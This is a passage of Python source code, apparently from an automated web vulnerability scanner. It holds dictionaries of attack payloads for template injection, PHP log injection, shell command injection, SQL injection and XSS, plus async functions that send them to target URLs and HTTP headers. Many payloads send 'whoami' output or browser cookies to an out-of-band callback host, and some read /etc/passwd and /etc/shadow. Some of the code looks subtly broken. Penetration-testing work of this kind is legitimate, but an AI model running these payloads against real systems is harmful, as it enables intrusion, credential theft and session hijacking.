        "<%= 7*7 %>",
        "#{7*7}",
        "{{config}}",
        "${config}",
        "<%= config %>",
        "#{config}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "${''.__class__.__mro__[1].__subclasses__()}",
        "<%= ''.class.mro[1].subclasses %>",
        "#{''.class.mro[1].subclasses}",
        "{{''.__class__.__mro__[1].__subclasses__()[401](['id'], stdout=-1).communicate()[0].strip()}}",
        "${''.__class__.__mro__[1].__subclasses__()[401](['id'], stdout=-1).communicate()[0].strip()}",
        "<%= ''.class.mro[1].subclasses[401](['id'], stdout=-1).communicate[0].strip %>",
        "#{''.class.mro[1].subclasses[401](['id'], stdout=-1).communicate[0].strip}",
    ],
    "log_injection": [
        "<?php system('id'); ?>",
        "<?php echo shell_exec('id'); ?>",
        "<?php passthru('id'); ?>",
        "<?php exec('id'); ?>",
        "<?php `id`; ?>",
        "<?php system('curl http://INTERACTSH_URL/$(whoami)'); ?>",
        "<?php echo shell_exec('curl http://INTERACTSH_URL/$(whoami)'); ?>",
        "<?php passthru('curl http://INTERACTSH_URL/$(whoami)'); ?>",
        "<?php exec('curl http://INTERACTSH_URL/$(whoami)'); ?>",
        "<?php `curl http://INTERACTSH_URL/$(whoami)`; ?>",
    ],
    "command_injection": [
        "`id`",
        "$(id)",
        "; id",
        "& id",
        "| id",
        "&& id",
        "|| id",
        "`curl http://INTERACTSH_URL/`whoami``",
        "$(curl http://INTERACTSH_URL/`whoami`)",
        "; curl http://INTERACTSH_URL/`whoami`",
        "& curl http://INTERACTSH_URL/`whoami`",
        "| curl http://INTERACTSH_URL/`whoami`",
        "&& curl http://INTERACTSH_URL/`whoami`",
        "|| curl http://INTERACTSH_URL/`whoami`",
    ],
    "sql_injection": [
        "' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT UNHEX(HEX(@@HOSTNAME))), '.INTERACTSH_URL\\\\', 'abc'))--",
        "' UNION SELECT UTL_HTTP.REQUEST('http://INTERACTSH_URL') FROM DUAL--",
        "' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS('INTERACTSH_URL') FROM DUAL--",
        "COPY (SELECT '') TO PROGRAM 'nslookup INTERACTSH_URL'--",
        "' UNION SELECT pg_sleep(1), pg_read_file('http://INTERACTSH_URL/')--",
        "' UNION SELECT pg_sleep(1), pg_read_file('file:///etc/passwd')--",
        "' UNION SELECT pg_sleep(1), pg_read_file('file:///etc/shadow')--",
        "' UNION SELECT pg_sleep(1), pg_read_file('file:///etc/hosts')--",
        "' UNION SELECT pg_sleep(1), pg_read_file('file:///etc/issue')--",
        "' UNION SELECT pg_sleep(1), pg_read_file('file:///etc/motd')--",
    ],
    "xss": [
        "<img src=x onerror=\"fetch('http://INTERACTSH_URL/'+document.cookie)\">",
        "<img src=x onerror=\"new Image().src='http://INTERACTSH_URL/'+document.cookie\">",
        "<img src=x onerror=\"var x=new XMLHttpRequest();x.open('GET','http://INTERACTSH_URL/'+document.cookie);x.send();\">",
        "<img src=x onerror=\"var x=new Image();x.src='http://INTERACTSH_URL/'+document.cookie;\">",
        "<img src=x onerror=\"var x=new Image();x.src='http://INTERACTSH_URL/'+btoa(document.cookie);\">",
        "<img src=x onerror=\"var x=new Image();x.src='http://INTERACTSH_URL/'+encodeURIComponent(document.cookie);\">",
        "<img src=x onerror=\"var x=new Image();x.src='http://INTERACTSH_URL/'+encodeURIComponent(document.domain);\">",
        "<img src=x onerror=\"var x=new Image();x.src='http://INTERACTSH_URL/'+encodeURIComponent(document.domain+':'+document.cookie);\">",
        "<img src=x onerror=\"var x=new Image();x.src='http://INTERACTSH_URL/'+encodeURIComponent(document.domain+':'+document.cookie+':'+document.location);\">",
        "<img src=x onerror=\"var x=new Image();x.src='http://INTERACTSH_URL/'+encodeURIComponent(document.domain+':'+document.cookie+':'+document.location+':'+document.referrer);\">",
    ],
}

# Add other categories as needed: SSRF, Header Injection, NoSQL Injection, LFI specific variations etc.

async def test_vulnerability(self, url: str, method: str = "GET", params=None, data=None, headers=None):
    self.console.print_info(f"Testing vulnerabilities on {method} {url}")
    findings = []
    
    params = params or {}
    data = data or {}
    headers = headers or {}
    
    # Función auxiliar para probar payloads
    async def test_payloads(payload_dict, vuln_type, verify_func):
        for category, payloads in payload_dict.items():
            if isinstance(payloads, dict):
                for subcat, sub_payloads in payloads.items():
                    for payload in sub_payloads:
                        self.console.print_debug(f"Testing {vuln_type}-{category}-{subcat}: {payload}")
                        finding = await self._test_single_payload(url, method, payload, params, data, headers, verify_func)
                        if finding:
                            findings.append(finding)
            else:
                for payload in payloads:
                    self.console.print_debug(f"Testing {vuln_type}-{category}: {payload}")
                    finding = await self._test_single_payload(url, method, payload, params, data, headers, verify_func)
                    if finding:
                        findings.append(finding)
    
    # Probar todas las categorías
    await test_payloads(SQLI_PAYLOADS, "SQLi", self._verify_sqli_error)
    await test_payloads(XSS_PAYLOADS, "XSS", self._verify_xss_reflection)
    await test_payloads(CMD_PAYLOADS, "CMDi", self._verify_cmdi_time)
    await test_payloads(SSTI_PAYLOADS, "SSTI", self._verify_ssti_calc)
    await test_payloads(PATH_TRAVERSAL_PAYLOADS, "PathTraversal", self._verify_path_traversal)
    if self.interactsh_url:
        await test_payloads(OOB_PAYLOADS, "OOB", self._verify_oob)
    
    # Añadir pruebas en cabeceras
    header_findings = await self.test_headers(url, method)
    findings.extend(header_findings)
    
    if findings:
        self.console.print_success(f"Found {len(findings)} vulnerabilities on {url}")
    else:
        self.console.print_debug(f"No vulnerabilities found on {url}")
    return findings

async def test_headers(self, url: str, method: str = "GET"):
    self.console.print_info(f"Testing headers on {method} {url}")
    findings = []
    
    headers_to_test = ["User-Agent", "Referer", "X-Forwarded-For", "Cookie"]
    all_payloads = {
        "SQLi": SQLI_PAYLOADS["error_based"],
        "XSS": XSS_PAYLOADS["filter_evasion"],
        "CMDi": CMD_PAYLOADS["blind_time"],
        "PathTraversal": PATH_TRAVERSAL_PAYLOADS["encoding_bypass"]
    }
    
    for header in headers_to_test:
        for vuln_type, payloads in all_payloads.items():
            for payload in payloads:
                test_headers = {header: payload}
                self.console.print_debug(f"Testing header {header} with {vuln_type}: {payload}")
                try:
                    response = await self._make_request(url, method, headers=test_headers)
                    content = await response.text()
                    if response.status >= 500:
                        findings.append({
                            "type": "header_injection",
                            "url": url,
                            "header": header,
                            "payload": payload,
                            "status": response.status,
                            "details": f"Server error (Len: {len(content)})"
                        })
                        self.console.print_success(f"Server error {response.status} on {header}: {payload}")
                    elif "alert(" in content or "error" in content.lower():
                        findings.append({
                            "type": vuln_type,
                            "url": url,
                            "header": header,
                            "payload": payload,
                            "status": response.status,
                            "details": f"Possible {vuln_type} in header (Len: {len(content)})"
                        })
                except Exception as e:
                    self.console.print_warning(f"Error testing header {header}: {e}")
    return findings

async def _verify_path_traversal(self, response):
    content = await response.text().lower()
    sensitive_keywords = ["/etc/passwd", "root:", "/windows/", "win.ini"]
    if response.status == 200 and any(keyword in content for keyword in sensitive_keywords):
        self.console.print_debug("Path traversal confirmed: sensitive content found")
        return True
    if response.status >= 500 and "error" in content:
        self.console.print_debug("Path traversal possible: server error")
        return True
    self.console.print_debug("Path traversal not confirmed")
    return False

